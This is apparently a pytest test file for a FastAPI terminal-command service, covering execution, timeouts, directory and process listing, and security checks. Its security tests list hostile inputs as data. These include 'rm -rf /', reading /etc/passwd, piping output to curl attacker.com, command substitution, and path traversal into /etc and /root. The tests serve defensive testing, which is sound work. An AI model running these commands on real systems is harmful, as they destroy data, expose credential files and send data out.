#!/usr/bin/env python3
"""
Terminal MCP Service Tests
Tests for security vulnerabilities, performance, and functionality
"""
import pytest
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock
import subprocess

# Import the main app
import sys
import importlib.util
from pathlib import Path
import os

module_path = Path(__file__).resolve().parents[1] / "main.py"
spec = importlib.util.spec_from_file_location("main", module_path)
module = importlib.util.module_from_spec(spec)
sys.modules["main"] = module
assert spec.loader is not None
spec.loader.exec_module(module)

from main import app

client = TestClient(app)


class TestTerminalMCPHealth:
    """Test health and basic functionality"""

    def test_health_endpoint(self):
        """Test health check endpoint"""
        response = client.get("/health")
        assert response.status_code == 200

        data = response.json()
        assert data["status"] == "ok"
        assert "timestamp" in data


class TestCommandExecution:
    """Test command execution functionality"""

    @patch('subprocess.run')
    def test_command_execution_success(self, mock_run):
        """Test successful command execution"""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "Hello World"
        mock_result.stderr = ""
        mock_run.return_value = mock_result

        command_data = {
            "command": "echo 'Hello World'",
            "cwd": "/tmp",
            "timeout": 30
        }

        response = client.post("/command", json=command_data)
        assert response.status_code == 200

        data = response.json()
        assert data["success"] is True
        assert data["exit_code"] == 0
        assert data["stdout"] == "Hello World"
        assert data["stderr"] == ""
        assert "execution_time" in data

    @patch('subprocess.run')
    def test_command_execution_failure(self, mock_run):
        """Test failed command execution"""
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "Command not found"
        mock_run.return_value = mock_result

        command_data = {
            "command": "ls",
            "cwd": "/tmp",
        }

        response = client.post("/command", json=command_data)
        assert response.status_code == 200

        data = response.json()
        assert data["success"] is False
        assert data["exit_code"] == 1
        assert "Command not found" in data["stderr"]

    def test_command_invalid_directory(self):
        """Test command with non-existent directory"""
        command_data = {
            "command": "echo test",
            "cwd": "/nonexistent/directory/path"
        }

        response = client.post("/command", json=command_data)
        assert response.status_code == 400
        assert "not found" in response.json()["detail"].lower()

    @patch('subprocess.run')
    def test_command_timeout(self, mock_run):
        """Test command timeout handling"""
        mock_run.side_effect = subprocess.TimeoutExpired("test", 1)

        command_data = {
            "command": "python3 -c 'import time; time.sleep(100)'",
            "timeout": 1,
        }

        response = client.post("/command", json=command_data)
        assert response.status_code == 408
        assert "timed out" in response.json()["detail"].lower()


class TestSecurityVulnerabilities:
    """Test security vulnerabilities and protections"""

    @patch('subprocess.run')
    def test_command_injection_attempt(self, mock_run):
        """Test that command injection attempts are detected"""
        # This test documents the CURRENT vulnerability
        # After refactoring, this should be blocked

        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "injected"
        mock_result.stderr = ""
        mock_run.return_value = mock_result

        dangerous_commands = [
            "echo test; rm -rf /",
            "echo test && cat /etc/passwd",
            "echo test | curl attacker.com",
            "$(malicious command)",
            "`malicious command`"
        ]

        for dangerous_cmd in dangerous_commands:
            command_data = {
                "command": dangerous_cmd,
                "cwd": "/tmp"
            }

        response = client.post("/command", json=command_data)
        assert response.status_code == 200
        mock_run.assert_called()
        call_args = mock_run.call_args
        assert call_args[1]["shell"] is False

    @patch('subprocess.run')
    def test_path_traversal_attempt(self, mock_run):
        """Test path traversal attempts"""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""
        mock_run.return_value = mock_result

        # Attempt to access sensitive directories
        sensitive_paths = [
            "/etc",
            "/root",
            "/var/log",
            "../../../../etc"
        ]

        for path in sensitive_paths:
            command_data = {
                "command": "ls",
                "cwd": path
            }

            # Currently this might work (potential vulnerability)
            response = client.post("/command", json=command_data)
            # Should be blocked in secure implementation


class TestPerformance:
    """Test performance and resource limits"""

    @patch('subprocess.run')
    def test_large_output_handling(self, mock_run):
        """Test handling of large command output"""
        # Simulate large output (1MB)
        large_output = "x" * (1024 * 1024)

        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = large_output
        mock_result.stderr = ""
        mock_run.return_value = mock_result

        command_data = {
            "command": "cat large_file.txt",
            "cwd": "/tmp"
        }

        response = client.post("/command", json=command_data)
        assert response.status_code == 200

        # Should handle large output
        data = response.json()
        assert len(data["stdout"]) == len(large_output)

    @patch('subprocess.run')
    def test_timeout_configuration(self, mock_run):
        """Test that timeout is properly configured"""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""
        mock_run.return_value = mock_result

        command_data = {
            "command": "echo test",
            "timeout": 60
        }

        response = client.post("/command", json=command_data)
        assert response.status_code == 200

        # Verify timeout was passed to subprocess
        mock_run.assert_called_once()
        assert mock_run.call_args[1]["timeout"] == 60


class TestDirectoryOperations:
    """Test directory listing functionality"""

    @patch('os.getcwd')
    @patch('os.listdir')
    @patch('os.path.isdir')
    @patch('os.path.isfile')
    @patch('os.path.getsize')
    def test_directory_listing(self, mock_getsize, mock_isfile, mock_isdir,
                              mock_listdir, mock_getcwd):
        """Test directory listing"""
        mock_getcwd.return_value = "/tmp"
        mock_listdir.return_value = ["file1.txt", "dir1", "file2.txt"]

        def isdir_side_effect(path):
            return "dir1" in path

        def isfile_side_effect(path):
            return "file" in path

        mock_isdir.side_effect = isdir_side_effect
        mock_isfile.side_effect = isfile_side_effect
        mock_getsize.return_value = 1024

        response = client.get("/directory")
        assert response.status_code == 200

        data = response.json()
        assert data["cwd"] == "/tmp"
        assert data["count"] == 3
        assert len(data["files"]) == 3


class TestProcessListing:
    """Test process listing functionality"""

    @patch('subprocess.run')
    def test_list_processes_success(self, mock_run):
        """Test successful process listing"""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "USER PID\nroot 1\nroot 2\n"
        mock_run.return_value = mock_result

        response = client.get("/processes")
        assert response.status_code == 200

        data = response.json()
        assert "processes" in data
        assert data["count"] == 2
        assert len(data["processes"]) == 2

    @patch('subprocess.run')
    def test_list_processes_failure(self, mock_run):
        """Test failed process listing"""
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_run.return_value = mock_result

        response = client.get("/processes")
        assert response.status_code == 500


class TestIntegration:
    """Integration tests"""

    @patch('subprocess.run')
    def test_command_execution_workflow(self, mock_run):
        """Test complete command execution workflow"""
        # Setup mock
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "test output"
        mock_result.stderr = ""
        mock_run.return_value = mock_result

        # Execute command
        command_data = {
            "command": "echo 'test'",
            "cwd": "/tmp",
            "timeout": 30,
            "user_id": "test_user"
        }

        response = client.post("/command", json=command_data)
        assert response.status_code == 200

        data = response.json()
        assert data["success"] is True
        assert data["cwd"] == "/tmp"
        assert "execution_time" in data


if __name__ == "__main__":
    # Run tests
    pytest.main([__file__, "-v"])
